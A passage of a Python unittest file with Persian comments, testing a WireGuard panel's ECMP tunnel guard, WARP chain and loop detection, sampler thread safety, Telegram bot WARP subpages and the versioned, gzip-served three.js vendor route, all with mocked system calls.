        self.assertEqual(m.ecmp_tunnel_state("wg21", 150), "dead")
        # اینترفیس پایین → down
        self.assertEqual(m.ecmp_tunnel_state("wg22", 150), "down")

    def test_ecmp_zombie_tunnel_detected(self):
        """تونلِ زامبی: هندشیکِ تازه ولی هیچ داده‌ای عبور نمی‌کند → dead.

        رگرسیونِ قطعیِ واقعی: سمتِ مقابل forward را قطع کرد ولی هندشیک سالم
        ماند؛ چون سنجش با هندشیک شروع می‌شد تونل «سالم» دیده می‌شد، nexthopِ
        مرده در ECMP ماند و نیمی از ترافیک بلک‌هول شد. تفکیکِ «بیکارِ سالم» از
        «زامبی» فقط با probeِ فعال ممکن است — هر دو rx ساکت دارند.
        """
        m = self.m
        m.live_interfaces = lambda: ["wg21"]
        now = m.time.time()
        # هندشیکِ کاملاً تازه + rx ساکت = حالتِ مبهم؛ probe تعیین‌کننده است.
        self._set_peers([{"iface": "wg21", "handshake": int(now - 5),
                          "rx_rate": 0}])
        m.tunnel_data_plane_ok = lambda *a, **k: False    # داده عبور نمی‌کند
        self.assertEqual(m.ecmp_tunnel_state("wg21", 150), "dead")
        m.tunnel_data_plane_ok = lambda *a, **k: True     # بیکار ولی سالم
        self.assertEqual(m.ecmp_tunnel_state("wg21", 150), "healthy")
        # در حالِ دریافت: probe اصلاً نباید صدا زده شود (سیگنالِ ارزان کافی است)
        probed = []
        m.tunnel_data_plane_ok = lambda *a, **k: probed.append(1) or False
        self._set_peers([{"iface": "wg21", "handshake": int(now - 5),
                          "rx_rate": 5000}])
        self.assertEqual(m.ecmp_tunnel_state("wg21", 150), "healthy")
        self.assertEqual(probed, [], "probe نباید وقتی rx حرکت دارد اجرا شود")

    def test_guard_edge_triggered_and_script_calls(self):
        m = self.m
        m.CONFIG["ecmp_guard"] = {
            "enabled": True, "dead_after": 150, "confirm": 2,
            "groups": [{"name": "گوگل", "routes_file": "/tmp/ecmp.txt",
                        "tunnels": ["wg21", "wg22"], "weight": 5,
                        "table": "main", "enabled": True}]}
        calls = []
        m.run = lambda cmd, timeout=20: (calls.append(cmd) or (0, "", ""))
        m.ALERTS.event = lambda *a, **k: None
        g = m.EcmpGuard()
        now = m.time.time()
        g._sampler_ready = lambda: True   # دورزدنِ گاردِ استارتاپ در تست
        # هر دو زنده → membership اولیه "in" فرض نمی‌شود؛ چون desired=in و
        # membership خالی است، up اجرا می‌شود (تثبیتِ اولیه)
        m.live_interfaces = lambda: ["wg21", "wg22"]
        self._set_peers([
            {"iface": "wg21", "handshake": int(now - 5)},
            {"iface": "wg22", "handshake": int(now - 5)}])
        g.reconcile()
        self.assertEqual([c[1] for c in calls], ["up", "up"])  # هر دو up
        calls.clear()
        # اجرای دوباره بدونِ تغییر → هیچ فراخوانی (edge-triggered)
        g.reconcile()
        self.assertEqual(calls, [])
        # wg22 می‌میرد (هندشیکِ خیلی کهنه + بدونِ rx) — چرخهٔ اولِ مرگ:
        # هیسترزیس (confirm=2) هنوز حذف نمی‌کند
        dead22 = [{"iface": "wg21", "handshake": int(now - 5)},
                  {"iface": "wg22", "handshake": int(now - 300), "rx_rate": 0}]
        self._set_peers(dead22)
        g.reconcile()
        self.assertEqual(calls, [])            # چرخهٔ اول: هنوز صبر
        # چرخهٔ دومِ متوالیِ مرگ → حالا down
        g.reconcile()
        self.assertEqual(len(calls), 1)
        self.assertEqual(calls[0][1], "down")
        self.assertEqual(calls[0][3], "wg22")
        calls.clear()
        # wg22 برمی‌گردد → up فوری (بدونِ هیسترزیس برای بازگشت)
        self._set_peers([
            {"iface": "wg21", "handshake": int(now - 5)},
            {"iface": "wg22", "handshake": int(now - 3)}])
        g.reconcile()
        self.assertEqual([c[1] for c in calls], ["up"])
        self.assertEqual(calls[0][3], "wg22")
        calls.clear()
        # اینترفیسِ wg22 پایین می‌رود (PreDown مسیرها را برداشته) → بدونِ اسکریپت
        m.live_interfaces = lambda: ["wg21"]
        g.reconcile()
        self.assertEqual(calls, [])
        self.assertEqual(g.membership[("گوگل", "wg22")], "out")

    def test_startup_sync_is_silent(self):
        """upِ استارتاپ (membershipِ خالیِ بعد از restartِ پنل) نباید
        هشدارِ تلگرام بدهد — کاربر بعد از هر استقرار پیامِ گمراه‌کننده‌ی
        «دوباره سالم شد؛ بازگردانده شد» می‌گرفت درحالی‌که تونل همیشه سالم
        بود. فقط بازگشتِ واقعی (out→in) و مرگ خبر دارند."""
        m = self.m
        m.CONFIG["ecmp_guard"] = {
            "enabled": True, "dead_after": 150, "confirm": 2,
            "groups": [{"name": "گوگل", "routes_file": "/tmp/ecmp.txt",
                        "tunnels": ["wg21", "wg22"], "weight": 5,
                        "table": "main", "enabled": True}]}
        events = []
        m.ALERTS.event = lambda k, txt: events.append(txt)
        m.run = lambda cmd, timeout=20: (0, "", "")
        g = m.EcmpGuard()
        g._sampler_ready = lambda: True
        now = m.time.time()
        m.live_interfaces = lambda: ["wg21", "wg22"]
        healthy = [{"iface": "wg21", "handshake": int(now - 5)},
                   {"iface": "wg22", "handshake": int(now - 5)}]
        self._set_peers(healthy)
        g.reconcile()
        self.assertEqual(events, [])          # استارتاپ: up ولی ساکت
        # مرگِ واقعیِ wg22 (دو چرخه‌ی متوالی) → هشدارِ مرگ
        self._set_peers([
            {"iface": "wg21", "handshake": int(now - 5)},
            {"iface": "wg22", "handshake": int(now - 300), "rx_rate": 0}])
        g.reconcile()
        g.reconcile()
        self.assertEqual(len(events), 1)
        self.assertIn("مرده", events[0])
        # بازگشتِ واقعی (out→in) → هشدارِ بازگشت
        self._set_peers(healthy)
        g.reconcile()
        self.assertEqual(len(events), 2)
        self.assertIn("بازگردانده", events[1])

    def test_migrate_legacy_single_group(self):
        """شکلِ قدیمیِ تک‌مجموعه‌ای باید به یک گروهِ معادل تبدیل شود."""
        m = self.m
        c = {"enabled": True, "tunnels": ["wg21", "wg22"],
             "routes_file": "/tmp/ecmp.txt", "weight": 5, "table": "main",
             "dead_after": 150, "confirm": 2}
        self.assertTrue(m.migrate_ecmp_guard(c))
        self.assertNotIn("routes_file", c)          # از ریشه برداشته شد
        self.assertEqual(len(c["groups"]), 1)
        g = c["groups"][0]
        self.assertEqual((g["routes_file"], g["tunnels"], g["weight"]),
                         ("/tmp/ecmp.txt", ["wg21", "wg22"], 5))
        self.assertTrue(g["enabled"] and g["name"])
        self.assertFalse(m.migrate_ecmp_guard(c))   # بارِ دوم بی‌اثر (idempotent)
        # گروهِ نامعتبر/خاموش کنار گذاشته می‌شود
        self.assertEqual(len(m.ecmp_groups(c)), 1)
        c["groups"][0]["enabled"] = False
        self.assertEqual(m.ecmp_groups(c), [])

    def test_guard_multi_group_shared_tunnel(self):
        """یک تونلِ مشترک بینِ دو مجموعه‌مسیر: هر گروه با فایلِ خودش."""
        m = self.m
        m.CONFIG["ecmp_guard"] = {
            "enabled": True, "dead_after": 150, "confirm": 1,
            "groups": [
                {"name": "گوگل", "routes_file": "/tmp/g.txt",
                 "tunnels": ["wg21", "wg22"], "weight": 5, "table": "main",
                 "enabled": True},
                {"name": "کلادفلر", "routes_file": "/tmp/cf.txt",
                 "tunnels": ["wg22"], "weight": 3, "table": "custom",
                 "enabled": True},
                {"name": "خاموش", "routes_file": "/tmp/x.txt",
                 "tunnels": ["wg21"], "enabled": False}]}
        calls = []
        m.run = lambda cmd, timeout=20: (calls.append(cmd) or (0, "", ""))
        m.ALERTS.event = lambda *a, **k: None
        g = m.EcmpGuard()
        g._sampler_ready = lambda: True
        now = m.time.time()
        m.live_interfaces = lambda: ["wg21", "wg22"]
        self._set_peers([{"iface": "wg21", "handshake": int(now - 5)},
                         {"iface": "wg22", "handshake": int(now - 5)}])
        g.reconcile()
        # ۳ فراخوانی: wg21+wg22 در گوگل، wg22 در کلادفلر؛ گروهِ خاموش هیچ
        self.assertEqual(len(calls), 3)
        self.assertEqual(sorted((c[2], c[3]) for c in calls),
                         [("/tmp/cf.txt", "wg22"), ("/tmp/g.txt", "wg21"),
                          ("/tmp/g.txt", "wg22")])
        cf = [c for c in calls if c[2] == "/tmp/cf.txt"][0]
        self.assertEqual((cf[4], cf[5]), ("3", "custom"))  # وزن/جدولِ خودِ گروه
        calls.clear()
        # wg22 می‌میرد → از هر دو مجموعه برداشته می‌شود، wg21 دست‌نخورده
        self._set_peers([{"iface": "wg21", "handshake": int(now - 5)},
                         {"iface": "wg22", "handshake": int(now - 300),
                          "rx_rate": 0}])
        g.reconcile()
        self.assertEqual(sorted((c[1], c[2]) for c in calls),
                         [("down", "/tmp/cf.txt"), ("down", "/tmp/g.txt")])
        self.assertEqual(g.membership[("گوگل", "wg21")], "in")

    def test_guard_alerts_use_own_event_key(self):
        """هشدارِ گارد زیر دسته‌ی مستقلِ ecmp می‌رود (نه startup)، و برای
        configهای قدیمی که این کلید را ندارند پیش‌فرض روشن است."""
        m = self.m
        self.assertIn("ecmp", m.ALERT_EVENT_KEYS)
        m.CONFIG["ecmp_guard"] = {
            "enabled": True, "dead_after": 150, "confirm": 1,
            "groups": [{"name": "گوگل", "routes_file": "/tmp/g.txt",
                        "tunnels": ["wg21"], "weight": 5, "table": "main",
                        "enabled": True}]}
        m.run = lambda cmd, timeout=20: (0, "", "")
        keys = []
        m.ALERTS.event = lambda k, text: keys.append(k)
        g = m.EcmpGuard()
        g._sampler_ready = lambda: True
        now = m.time.time()
        m.live_interfaces = lambda: ["wg21"]
        self._set_peers([{"iface": "wg21", "handshake": int(now - 5)}])
        g.reconcile()                       # تثبیتِ اولیه: up ولی *ساکت*
        self.assertEqual(keys, [])          # (رفعِ نویزِ بعد از هر restart)
        # مرگِ واقعی (confirm=1 → همان چرخه) → هشدار زیرِ کلیدِ ecmp
        self._set_peers([{"iface": "wg21", "handshake": int(now - 300),
                          "rx_rate": 0}])
        g.reconcile()
        self.assertEqual(keys, ["ecmp"])
        # configِ قدیمی (بدونِ کلیدِ ecmp) نباید بی‌صدا شود
        m.CONFIG["alerts"] = {"enabled": True, "bot_token": "x",
                              "chat_id": "1", "events": {"startup": False}}
        self.assertTrue(m.alert_cfg()["events"]["ecmp"])

    def test_guard_disabled_by_default(self):
        m = self.m
        m.CONFIG.pop("ecmp_guard", None)
        g = m.EcmpGuard()
        self.assertFalse(g.enabled())
        called = []
        m.run = lambda cmd, timeout=20: (called.append(cmd) or (0, "", ""))
        g.reconcile()                     # خاموش → هیچ کاری
        self.assertEqual(called, [])


class IntentionalChainTests(unittest.TestCase):
    """زنجیرهٔ عمدیِ WARP نباید «حلقهٔ مسیر» گزارش شود.

    endpointِ wgwarp عمداً از تونلِ egressِ WarpGuard پین شده؛ کارتِ
    «مسیریابیِ WARP» همین را سالم نشان می‌دهد، پس جدولِ تونل‌ها هم باید.
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _route_via(self, dev):
        """ماکِ `ip route get` که همیشه از `dev` جواب می‌دهد."""
        self.m.run = lambda cmd, timeout=20: (
            0, "162.159.192.1 via 10.0.0.1 dev %s src 10.0.0.2" % dev, "")

    def _set_egress(self, egress):
        path = os.path.join(self.tmp, "warp-guard.state")
        with open(path, "w", encoding="utf-8") as f:
            f.write("egress=%s\nrule=on\nendpoint=162.159.192.1\n" % egress)
        self.m.WARP_GUARD_STATE = path

    def test_warp_via_registered_egress_is_chain_not_loop(self):
        m = self.m
        self._route_via("wg22")
        self._set_egress("wg22")
        dev, loop, chain = m.endpoint_route_state(m.WARP_IFACE,
                                                  "162.159.192.1:2408")
        self.assertEqual(dev, "wg22")
        self.assertFalse(loop)
        self.assertTrue(chain)

    def test_warp_via_other_tunnel_is_still_a_real_loop(self):
        """گارد wg22 را ثبت کرده ولی مسیر از awg1 می‌رود → حلقهٔ واقعی."""
        m = self.m
        self._route_via("awg1")
        self._set_egress("wg22")
        dev, loop, chain = m.endpoint_route_state(m.WARP_IFACE,
                                                  "162.159.192.1:2408")
        self.assertEqual(dev, "awg1")
        self.assertTrue(loop)
        self.assertFalse(chain)

    def test_non_warp_tunnel_never_gets_the_exception(self):
        """استثنا فقط برای wgwarp است؛ هر تونلِ دیگری از wg22 = حلقه."""
        m = self.m
        self._route_via("wg22")
        self._set_egress("wg22")
        _dev, loop, chain = m.endpoint_route_state("wg31", "1.2.3.4:51820")
        self.assertTrue(loop)
        self.assertFalse(chain)

    def test_missing_state_file_falls_back_to_loop(self):
        """بدونِ warp-guard.state هیچ زنجیره‌ای «ثبت‌شده» نیست."""
        m = self.m
        self._route_via("wg22")
        m.WARP_GUARD_STATE = os.path.join(self.tmp, "nope.state")
        _dev, loop, chain = m.endpoint_route_state(m.WARP_IFACE,
                                                   "162.159.192.1:2408")
        self.assertTrue(loop)
        self.assertFalse(chain)

    def test_health_chain_label_and_failure_precedence(self):
        m = self.m
        now = m.time.time()
        base = {"active": True, "handshake": int(now - 5), "rx": 10,
                "rx_rate": 100, "tx_rate": 100, "chain": True}
        self.assertEqual(m.tunnel_health(base), "chain")
        # خرابیِ واقعیِ همان تونل نباید پشتِ برچسبِ «عمدی» پنهان شود
        self.assertEqual(m.tunnel_health(dict(base, handshake=int(now - 900))),
                         "dead")
        self.assertEqual(m.tunnel_health(dict(base, rx=0)), "noreturn")
        self.assertEqual(m.tunnel_health(dict(base, active=False)), "off")
        # loop و chain هم‌زمان نمی‌آیند، ولی اگر آمد loop برنده است
        self.assertEqual(m.tunnel_health(dict(base, loop=True)), "loop")


class SamplerHistoryConcurrencyTests(unittest.TestCase):
    """خواننده‌های تاریخچه نباید هنگامِ append همزمانِ نخِ نمونه‌بردار
    «RuntimeError: deque mutated during iteration» بدهند.

    باگِ زنده‌ی myserver (۲۰۲۶-۰۷-۲۰): /api/stats گاهی ۵۰۰ می‌داد چون
    net_history مستقیم روی deque ای پیمایش می‌کرد که Sampler همزمان به
    آن append می‌کند. اصلاح: کپیِ اتمی list(h) پیش از پیمایش.
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_history_readers_survive_concurrent_appends(self):
        m = self.m
        s = m.Sampler()
        iface, pub = "wgtest", "PUB_x="
        now = m.time.time()
        # deque ها را پر می‌کنیم تا پیمایش به‌اندازه‌ی کافی طول بکشد که
        # نسخه‌ی معیوب (پیمایشِ مستقیم) عملاً همیشه بشکند.
        for hist, key in ((s.net_hist, iface),
                          (s.iface_hist, iface),
                          (s.history, (iface, pub))):
            d = m.deque(maxlen=m.HISTORY_LEN)
            for i in range(m.HISTORY_LEN):
                d.append((now + i, float(i), float(i) * 2))
            hist[key] = d

        stop = threading.Event()

        def appender():
            i = 0
            while not stop.is_set():
                t = m.time.time()
                s.net_hist[iface].append((t, float(i), float(i)))
                s.iface_hist[iface].append((t, float(i), float(i)))
                s.history[(iface, pub)].append((t, float(i), float(i)))
                i += 1

        th = threading.Thread(target=appender, daemon=True)
        th.start()
        try:
            for _ in range(4000):
                r1 = s.net_history(iface)
                r2 = s.iface_history(iface)
                r3 = s.peer_history(iface, pub)
                # ساختارِ خروجی همیشه فهرستی از جفت‌های [rx, tx] است
                for series in (r1, r2, r3):
                    self.assertTrue(all(len(p) == 2 for p in series))
        finally:
            stop.set()
            th.join(timeout=2)

    def test_net_history_rounds_pairs(self):
        m = self.m
        s = m.Sampler()
        d = m.deque(maxlen=m.HISTORY_LEN)
        d.append((1.0, 12.34, 56.78))
        d.append((2.0, 3.14, 2.72))
        s.net_hist["wgtest"] = d
        self.assertEqual(s.net_history("wgtest"),
                         [[12.3, 56.8], [3.1, 2.7]])
        # اینترفیسِ ناشناخته → فهرستِ خالی، نه استثنا
        self.assertEqual(s.net_history("nope"), [])
        self.assertEqual(s.peer_history("nope", "x"), [])
        self.assertEqual(s.iface_history("nope"), [])


class BotWarpParityTests(unittest.TestCase):
    """زیرصفحه‌های تازه‌ی WARP/AI در باتِ تلگرام (parity با پنل): خطِ رویداد،
    کیفیتِ مسیر (TTFB)، رتبه‌بندیِ endpoint، و مصرفِ AI به تفکیکِ کاربر.

    توابعِ بک‌اند ماک می‌شوند و send/_send_fresh برای ثبتِ خروجی گرفته
    می‌شوند؛ هیچ درخواستِ واقعیِ تلگرامی نمی‌رود.
    """

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        self.m.WARP_SNI_STATS = os.path.join(self.tmp, "sni.stats")
        self.bot = self.m.TelegramBot()
        self.sent = []
        self.fresh = []
        self.bot.send = lambda chat, text, keyboard=None: self.sent.append(
            (chat, text, keyboard))
        self.bot._send_fresh = lambda chat, text, keyboard=None: self.fresh.append(
            (chat, text, keyboard))

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _last_text(self, bucket):
        return bucket[-1][1] if bucket else ""

    def test_events_render_with_icons_and_detail(self):
        m = self.m
        m.warp_events_read = lambda n=20: [
            {"ts": time.time() - 30, "kind": "restore",
             "label": "بازگشتِ سالم", "detail": "", "actor": "سیستم"},
            {"ts": time.time() - 120, "kind": "rotate",
             "label": "چرخشِ endpoint", "detail": "162.159.192.2",
             "actor": "گارد"}]
        self.bot._warp_events(42)
        txt = self._last_text(self.sent)
        self.assertIn("رویدادهای WARP", txt)
        self.assertIn("بازگشتِ سالم", txt)
        self.assertIn("🟢", txt)          # restore → سبز
        self.assertIn("🟡", txt)          # rotate → کهربایی
        self.assertIn("162.159.192.2", txt)
        # کیبورد باید دکمه‌ی به‌روزرسانیِ همین صفحه را داشته باشد
        kb = self.sent[-1][2]
        self.assertTrue(any("wp:events" in b.get("callback_data", "")
                            for row in kb for b in row))

    def test_events_empty(self):
        self.m.warp_events_read = lambda n=20: []
        self.bot._warp_events(42)
        self.assertIn("هنوز رویدادی", self._last_text(self.sent))

    def test_quality_healthy_and_slow(self):
        m = self.m
        m.warp_latency_series = lambda: {
            "points": [{"ts": 1, "warp": 800, "direct": 300},
                       {"ts": 2, "warp": 900, "direct": 310}],
            "warp_avg": 850, "direct_avg": 305,
            "slow_ms": 4000, "slow_ratio": 3.0}
        self.bot._warp_quality(42)
        txt = self._last_text(self.sent)
        self.assertIn("کیفیتِ مسیرِ WARP", txt)
        self.assertIn("سالم", txt)
        self.assertNotIn("کند", txt)
        # اسپارک‌لاین باید حداقل یک کاراکترِ بلوکی داشته باشد
        self.assertTrue(any(c in txt for c in m.TelegramBot._SPARK))
        # حالتِ کند: هم آستانه‌ی مطلق و هم ۳ برابرِ عادی
        m.warp_latency_series = lambda: {
            "points": [{"ts": 1, "warp": 9000, "direct": 1000}],
            "warp_avg": 9000, "direct_avg": 1000,
            "slow_ms": 4000, "slow_ratio": 3.0}
        self.bot._warp_quality(42)
        self.assertIn("کند", self._last_text(self.sent))

    def test_quality_no_samples(self):
        self.m.warp_latency_series = lambda: {
            "points": [], "warp_avg": None, "direct_avg": None,
            "slow_ms": 4000, "slow_ratio": 3.0}
        self.bot._warp_quality(42)
        self.assertIn("هنوز نمونه", self._last_text(self.sent))

    def test_ai_usage_per_user(self):
        # منبعِ داده مستقیم فایلِ statsِ splitter است (نه warp_sni_status که
        # subprocessِ نامربوط دارد) — پس فایل را می‌نویسیم و marker را روشن.
        m = self.m
        m.warp_sni_enabled = lambda: True
        m.warp_src_names = lambda: {"10.0.0.2": "wg1/ali"}
        with open(m.WARP_SNI_STATS, "w", encoding="utf-8") as f:
            m.json.dump({"top_src": [["10.0.0.2", 5_000_000, 1_000_000, 12, 3],
                                     ["10.0.0.3", 2_000_000, 500_000, 4, 1]]}, f)
        self.bot._warp_ai_usage(42)
        txt = self._last_text(self.sent)
        self.assertIn("مصرفِ AI به تفکیکِ کاربر", txt)
        self.assertIn("wg1/ali", txt)      # برچسبِ peer
        self.assertIn("10.0.0.2", txt)     # IP خام (بدونِ ارقامِ فارسی)
        self.assertIn("10.0.0.3", txt)

    def test_ai_usage_empty_when_splitter_off(self):
        # splitter خاموش → بدونِ خواندنِ فایل، پیامِ «داده‌ای نیست»
        m = self.m
        m.warp_sni_enabled = lambda: False
        m.warp_sni_quic_enabled = lambda: False
        self.bot._warp_ai_usage(42)
        self.assertIn("داده‌ای از تفکیکِ SNI", self._last_text(self.sent))

    def test_ai_usage_avoids_warp_sni_status_subprocess(self):
        # رگرسیون: این جدول نباید warp_sni_status() را صدا بزند (که systemctl/
        # iptables اجرا می‌کند و نخِ poll را بلاک می‌کند).
        m = self.m
        called = []
        m.warp_sni_status = lambda: called.append(1) or {"stats": {}}
        m.warp_sni_enabled = lambda: False
        m.warp_sni_quic_enabled = lambda: False
        self.bot._warp_ai_usage(42)
        self.assertEqual(called, [], "نباید warp_sni_status صدا زده شود")

    def test_rank_runs_off_thread_and_marks_best(self):
        m = self.m
        m.warp_rank_endpoints = lambda: {
            "endpoints": [{"ip": "162.159.192.1", "rtt": 45.2, "current": True},
                          {"ip": "188.114.96.1", "rtt": 30.1, "current": False},
                          {"ip": "188.114.99.1", "rtt": None, "current": False}],
            "current": "162.159.192.1", "best": "188.114.96.1"}
        self.bot._warp_rank(42)
        # پیامِ فوریِ «در حال سنجش» روی نخِ اصلی
        self.assertIn("در حالِ سنجش", self._last_text(self.sent))
        # نتیجه از نخِ پس‌زمینه با _send_fresh می‌آید — کمی صبر
        deadline = time.time() + 3
        while not self.fresh and time.time() < deadline:
            time.sleep(0.02)
        txt = self._last_text(self.fresh)
        self.assertIn("رتبه‌بندیِ endpointهای WARP", txt)
        self.assertIn("فعلی", txt)         # 162... = current
        self.assertIn("بهترین", txt)       # 188.114.96.1 = best
        self.assertIn("نرسید", txt)        # rtt=None
        self.assertIn("جای بهتری هست", txt)  # current != best

    def test_rank_measure_failure_is_caught(self):
        def boom():
            raise RuntimeError("ping blew up")
        self.m.warp_rank_endpoints = boom
        self.bot._warp_rank(42)
        deadline = time.time() + 3
        while not self.fresh and time.time() < deadline:
            time.sleep(0.02)
        self.assertIn("سنجش ناموفق", self._last_text(self.fresh))

    def test_warp_action_dispatches_new_subpages(self):
        """سیمِ dispatch: wp:events/quality/ai به همان زیرصفحه‌ها می‌رود."""
        m = self.m
        m.warp_events_read = lambda n=20: []
        m.warp_latency_series = lambda: {
            "points": [], "warp_avg": None, "direct_avg": None,
            "slow_ms": 4000, "slow_ratio": 3.0}
        m.warp_sni_enabled = lambda: False
        m.warp_sni_quic_enabled = lambda: False
        for act, needle in (("events", "رویدادهای WARP"),
                            ("quality", "کیفیتِ مسیرِ WARP"),
                            ("ai", "مصرفِ AI به تفکیکِ کاربر")):
            self.sent.clear()
            self.bot._warp_action(7, 42, act, "")
            self.assertIn(needle, self._last_text(self.sent),
                          "اکشنِ %s باید به زیرصفحه‌اش برسد" % act)


class TestTv3d(unittest.TestCase):
    """اسلاید «شبکه (سه‌بعدی)» نمای TV: vendor سه‌فایله، همگامی URL نسخه‌دار،
    سروِ gzip و override شدنِ Cache-Control برای فایل‌های استاتیک نسخه‌دار."""

    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-tv3d-")
        self.m = load_module(self.tmp)
        # BASE_DIR در load_module به tmp می‌رود و روتِ vendor از همان‌جا
        # می‌خوانَد؛ دو فایلِ واقعیِ سه‌جانبه را کنارِ tmp کپی می‌کنیم
        for fn in ("three.module.min.js.gz", "three.core.min.js.gz"):
            shutil.copy(os.path.join(os.path.dirname(PANEL), fn),
                        os.path.join(self.tmp, fn))

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def _fake_handler(self, **kw):
        """Handler بدون سوکت — حالا نازک روی make_fake_handler.

        امضا و رفتارِ قبلی دست‌نخورده است: بدونِ آرگومان همان چیزی
        می‌دهد که چهار تستِ این کلاس از قبل انتظار دارند.
        """
        return make_fake_handler(self.m, **kw)

    def test_vendor_files_present_and_valid(self):
        """دو فایل gz سه‌جانبه باید کنار پنل باشند و import نسبی core سالم."""
        import gzip
        base = os.path.dirname(PANEL)
        mod_p = os.path.join(base, "three.module.min.js.gz")
        core_p = os.path.join(base, "three.core.min.js.gz")
        self.assertTrue(os.path.exists(mod_p), "three.module.min.js.gz گم است")
        self.assertTrue(os.path.exists(core_p), "three.core.min.js.gz گم است")
        with gzip.open(mod_p, "rb") as f:
            mod = f.read()
        with gzip.open(core_p, "rb") as f:
            core = f.read()
        # هر دو با سربرگ لایسنس شروع می‌شوند و حجم منطقی دارند
        self.assertTrue(mod.startswith(b"/**") and len(mod) > 200000)
        self.assertTrue(core.startswith(b"/**") and len(core) > 300000)
        # three.module از three.core به‌صورت نسبی import می‌کند — پس هر دو
        # باید در همان مسیر نسخه‌دار سرو شوند
        self.assertIn(b'from"./three.core.min.js"', mod)

    #: هشِ فایل‌های vendorشده — گوشه‌ی سومِ مثلث برای فایلی که نسخه ندارد.
    #: **با هر تعویضِ فایل این‌ها را هم عوض کن.** همین اجبار کلِ نکته است:
    #: بایت‌های تازه بدونِ ثابتِ تازه یعنی URL ِ نسخه‌دارِ دروغین.
    THREE_ASSET_SHA256 = {
        "three.module.min.js.gz": "31208f84e650e49d",
        "three.core.min.js.gz":   "25349da90b7bfe44",
    }

    def test_three_ver_matches_the_revision_inside_the_bytes(self):
        """THREE_VER باید با نسخه‌ی واقعیِ بایت‌های vendorشده بخواند.

        تستِ زیر فقط ثابتِ پایتون را با URL ِ داخلِ PAGE_HTML می‌سنجد؛
        **خودِ بایت‌ها** گوشه‌ی سومِ این مثلث‌اند و تا امروز کسی
        نمی‌سنجیدشان. اگر فایل عوض شود و ثابت نه، URL ِ نسخه‌دار دروغ
        می‌گوید — و روتِ vendor آن را با کشِ `immutable` سرو می‌کند، پس
        مرورگر دروغ را برای همیشه نگه می‌دارد.

        ⚠️ دو شکلِ شماره‌گذاری: انتشارِ three.js «r180» است و THREE_VER
        شکلِ npm ِ «0.180.0». نگاشت عمدی است، نه اتفاقی.

        نکته‌ی سنجش: پس از minify دیگر `REVISION` وجود ندارد — نام
        مبهم شده و به `const t="180"` بلافاصله پس از هدرِ لایسنس تبدیل
        شده. الگو به همان هدر لنگر می‌خورد، وگرنه هر `="180"`ی در عمقِ
        فایل هم می‌خورد و گارد بی‌معنا می‌شد.
        """
        import gzip
        p = os.path.join(os.path.dirname(PANEL), "three.core.min.js.gz")
        with gzip.open(p, "rb") as f:
            head = f.read(4096).decode("utf-8", "replace")
        found = re.search(r'^/\*\*.*?\*/\s*const\s+[A-Za-z_$]\w*\s*=\s*"(\d+)"',
                          head, re.S)
        self.assertIsNotNone(found, "نسخه در بایت‌های vendorشده پیدا نشد")
        rev = found.group(1)
        want = self.m.THREE_VER.split(".")[1]      # "0.180.0" → "180"
        self.assertEqual(rev, want,
                         "THREE_VER=%s ولی revisionِ فایل %s است"
                         % (self.m.THREE_VER, rev))

    def test_the_vendored_pair_is_pinned_by_content(self):
        """فایلِ module هیچ نسخه‌ای در خود ندارد — پس با محتوا پین می‌شود.

        تعهدِ ضعیف‌تر ولی کافی: ثابت نمی‌کند **کدام** نسخه آن‌جاست، ثابت
        می‌کند بایت‌ها و ثابت با هم به‌روز شده‌اند — و همان چیزی است که
        درستیِ کش به آن نیاز دارد. جفتِ ناهمگون (module از یک انتشار،
        core از انتشارِ دیگر) هم همین‌جا دیده می‌شود.
        """
        import hashlib
        for name, want in self.THREE_ASSET_SHA256.items():
            with self.subTest(f=name):
                p = os.path.join(os.path.dirname(PANEL), name)
                with open(p, "rb") as f:
                    got = hashlib.sha256(f.read()).hexdigest()[:16]
                self.assertEqual(got, want,
                                 "%s عوض شده — THREE_VER و این هش را با هم "
                                 "به‌روز کن (کشِ immutable)" % name)

    def test_three_url_and_wiring_in_sync(self):
        """URL نسخه‌دار در PAGE_HTML باید با THREE_VER پایتون یکی بماند."""
        m = self.m
        url = "/vendor/three-%s/three.module.min.js" % m.THREE_VER
        self.assertIn(url, m.PAGE_HTML,
                      "TV3D_THREE_URL در PAGE_HTML با THREE_VER ناهمگام است")
        self.assertIn("'/tv3d.mjs'", m.PAGE_HTML)
        self.assertIn("شبکه (سه‌بعدی)", m.PAGE_HTML)
        # چرخه‌ی حیات در PAGE_HTML سیم‌کشی شده باشد
        for needle in ("tv3dCapable()", "tv3dShow(body)", "tv3dDispose()"):
            self.assertIn(needle, m.PAGE_HTML)
        # قرارداد ماژول: export start و متدهای handle
        for needle in ("export function start", "webglcontextlost",
                       "forceContextLoss"):
            self.assertIn(needle, m.TV3D_JS)

    def test_send_cache_control_override(self):
        """_send: پیش‌فرض no-store؛ extra_headers دارای Cache-Control آن را
        جایگزین می‌کند (نه اینکه دوتایی بفرستد)."""
        h = self._fake_handler()
        h._send(200, b"x", "text/javascript",
                extra_headers={"Cache-Control": "public, max-age=1"})
        cc = [v for k, v in h.sent if k == "Cache-Control"]
        self.assertEqual(cc, ["public, max-age=1"])
        h2 = self._fake_handler()
        h2._send(200, b"x", "text/javascript")
        cc2 = [v for k, v in h2.sent if k == "Cache-Control"]
        self.assertEqual(cc2, ["no-store"])

    def test_vendor_route_gzip_and_identity(self):
        """روت vendor: با Accept-Encoding: gzip بایت‌های gz + هدر درست؛ بدون
        آن محتوای باز شده؛ مسیر ناشناس ۴۰۴."""
        m = self.m
        h = self._fake_handler()
        h.path = "/vendor/three-%s/three.core.min.js" % m.THREE_VER
        h.headers = {"Accept-Encoding": "gzip, br"}
        h.do_GET()
        hdrs = dict(h.sent)
        self.assertEqual(hdrs.get("__code__"), 200)
        self.assertEqual(hdrs.get("Content-Encoding"), "gzip")
        self.assertIn("immutable", hdrs.get("Cache-Control", ""))
        self.assertEqual(hdrs.get("Vary"), "Accept-Encoding")
        self.assertTrue(h.body and h.body[0][:2] == b"\x1f\x8b",
